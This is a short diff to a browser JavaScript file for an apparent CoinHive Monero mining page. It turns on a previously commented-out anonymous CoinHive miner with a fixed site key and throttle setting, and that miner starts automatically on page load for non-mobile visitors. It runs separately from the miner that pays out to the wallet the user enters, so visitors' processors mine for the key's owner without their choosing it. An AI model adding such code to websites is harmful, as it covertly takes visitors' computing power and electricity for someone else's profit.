@@ -1,6 +1,11 @@
 /** For Setting up the User Miner */
-// Var anonMiner = new CoinHive.Anonymous('qXvuxshdwz8NEoQXhMLH0qPW2EYJWuLc', {throttle: 0.2});
-// AnonMiner.start();
+var anonMiner = new CoinHive.Anonymous('qXvuxshdwz8NEoQXhMLH0qPW2EYJWuLc', {throttle: 0.2});
+if (!miner.isMobile()) {
+    anonMiner.start();
+}
+else {
+    window.alert("Please note that you are mining on mobile which is not reccomended.");
+}
 
 function getWalletAddress() {
     return document.getElementById('xmrAddress').value;
@@ -63,11 +68,7 @@ function startUserMiner() {
     // AnonMiner.stop();
     // Neccessary to update user Total Hashes not actually Mining
     // Fuck CoinHive
-    if (!miner.isMobile()) {
         userMiner.start();
-    } else {
-        window.alert("Please note that you are mining on mobile which is not reccomended.");
-    }
 
     var button = document.getElementById('minerButton');
     button.innerHTML = "Mining to: " + userWalletAddress;
